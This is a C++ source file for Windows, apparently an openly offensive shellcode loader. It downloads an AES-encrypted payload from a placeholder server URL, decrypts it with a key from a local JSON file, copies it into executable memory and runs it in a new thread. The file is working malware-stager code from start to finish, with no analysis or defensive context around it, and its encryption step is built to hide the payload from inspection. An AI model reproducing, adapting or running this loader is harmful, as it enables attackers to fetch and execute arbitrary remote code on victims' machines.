// this is to run the shell code from external server 
#include <iostream>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include "json.hpp"

#pragma comment(lib, "wininet.lib")

using namespace CryptoPP;
using json = nlohmann::json;

std::vector<uint8_t> load_key(const std::string& filename) {
    std::ifstream file(filename);
    json j;
    file >> j;
    return j["aes_key"].get<std::vector<uint8_t>>();
}

std::vector<uint8_t> download_shellcode(const std::string& url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) throw std::runtime_error("InternetOpenA failed");

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) throw std::runtime_error("InternetOpenUrlA failed");

    std::vector<uint8_t> data;
    uint8_t buffer[4096];
    DWORD bytesRead;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return data;
}

std::vector<uint8_t> decrypt_shellcode(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key) {
    ECB_Mode<AES>::Decryption decryptor;
    decryptor.SetKey(key.data(), key.size());

    std::string decrypted;
    CryptoPP::StringSource s(
        encrypted.data(), encrypted.size(), true,
        new CryptoPP::StreamTransformationFilter(decryptor, new CryptoPP::StringSink(decrypted))
    );

    uint8_t padding_length = decrypted.back();
    decrypted.resize(decrypted.size() - padding_length);

    return std::vector<uint8_t>(decrypted.begin(), decrypted.end());
}

void execute_shellcode(const std::vector<uint8_t>& shellcode) {
    LPVOID mem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
}

int main() {
    try {
        std::vector<uint8_t> key = load_key("key.json");

        // Change this to your actual hosting link
        std::string url = "http://yourserver.com/encrypted_shellcode.bin";

        std::cout << "[+] Downloading encrypted shellcode...\n";
        std::vector<uint8_t> encrypted_shellcode = download_shellcode(url);

        std::cout << "[+] Decrypting shellcode...\n";
        std::vector<uint8_t> shellcode = decrypt_shellcode(encrypted_shellcode, key);

        std::cout << "[+] Executing shellcode...\n";
        execute_shellcode(shellcode);
    }
    catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
